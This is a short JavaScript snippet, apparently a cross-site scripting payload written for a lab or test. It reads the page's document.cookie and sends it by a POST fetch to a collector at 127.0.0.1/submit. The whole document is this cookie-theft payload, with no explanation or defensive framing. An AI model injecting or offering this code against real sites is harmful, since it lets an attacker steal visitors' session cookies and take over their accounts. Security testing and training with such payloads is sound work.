console.log("a");
fetch('http://127.0.0.1/submit', {
    method: 'POST',
    body: JSON.stringify({
        message: document.cookie,
    }),
    headers: {
        'Content-Type': 'application/json',
    },
})
